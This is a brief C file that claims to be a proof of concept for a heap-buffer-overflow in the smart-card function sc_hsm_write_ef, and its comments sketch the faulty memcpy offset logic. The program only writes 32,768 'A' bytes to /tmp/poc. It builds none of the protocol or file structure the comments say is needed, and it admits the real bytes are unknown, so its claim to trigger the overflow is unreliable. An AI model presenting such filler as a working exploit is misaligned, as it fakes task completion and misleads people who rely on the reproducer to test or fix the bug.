#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Crafted input to trigger heap-buffer-overflow in sc_hsm_write_ef
    // The vulnerability occurs when writing an EF with a size that causes
    // an offset-based memcpy to read beyond the allocated buffer.
    // We need to create a PKCS#15 token info update that eventually calls
    // sc_hsm_write_ef with a large offset.
    
    // Simulate a crafted APDU or file structure that triggers the overflow
    // The exact bytes depend on the SC-HSM protocol, but we focus on
    // triggering the chunked write loop with a large count value.
    
    // Write a large buffer that will cause the offset to exceed allocation
    // The allocation is 8 + count bytes, but memcpy uses buf+offset
    // where offset can be larger than count when spanning multiple blocks.
    
    // Use fputc to generate the payload without hex arrays
    // We'll create a pattern that triggers the overflow
    for (int i = 0; i < 32768; i++) {
        fputc(0x41, f);  // Fill with 'A's to create a large buffer
    }
    
    fclose(f);
    return 0;
}